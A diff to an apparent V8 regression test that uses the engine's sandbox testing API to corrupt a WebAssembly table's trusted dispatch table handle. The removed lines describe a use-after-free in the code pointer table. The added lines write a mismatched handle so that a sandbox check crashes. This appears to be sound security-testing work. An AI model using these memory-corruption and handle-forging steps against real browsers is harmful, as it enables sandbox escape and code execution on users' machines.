@@ -9,8 +9,13 @@ d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
 const kHeapObjectTag = 1;
 const kWeakHeapObjectTag = 3;
 
-const kWasmTableObjectMaximumLengthOffset = 0x14;
-const kWasmTableObjectTrustedDispatchTableOffset = 0x1c;
+const kWasmTableType = Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
+const kWasmTableObjectMaximumLengthOffset =
+    Sandbox.getFieldOffset(kWasmTableType, 'maximum_length');
+const kWasmTableObjectTrustedDispatchTableOffset =
+    Sandbox.getFieldOffset(kWasmTableType, 'trusted_dispatch_table');
+const kWasmTableObjectTrustedDataOffset =
+    Sandbox.getFieldOffset(kWasmTableType, 'trusted_data');
 
 let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 
@@ -86,13 +91,13 @@ let tt = new WebAssembly.Table({initial: 0, maximum: 0x10, element: 'anyfunc'});
 //   throw 'found';
 // }
 
-// grow the transplanted table. this also clears out index 0 in the new WasmDispatchTable(Data)
-// this drops std::shared_ptr<WasmImportWrapperHandle> refcnt to 0, freeing the entry in WasmCPT
-// the original WasmDispatchTable is still very well alive
-let target_ofs = 0x5;
-console.log(`[*] using target_ofs = 0x${target_ofs.toString(16)}`);
-let h_target = h1 - h_stride * target_ofs;
-caged_write(addrof(tt) + kWasmTableObjectTrustedDispatchTableOffset, h_target);
+// Write a mismatched handle (WasmTrustedInstanceData) into the trusted_dispatch_table slot.
+// Growing the table will attempt to resolve this handle, which must fail verification
+// and trigger a sandbox mitigation crash.
+let h_mismatched = caged_read(addrof(dummy_table1) + kWasmTableObjectTrustedDataOffset);
+console.log(`[*] Using mismatched handle: 0x${h_mismatched.toString(16)}`);
+
+caged_write(addrof(tt) + kWasmTableObjectTrustedDispatchTableOffset, h_mismatched);
 tt.grow(0x10);
 
 // reclaim WasmCPT as a type-compatible wasm function
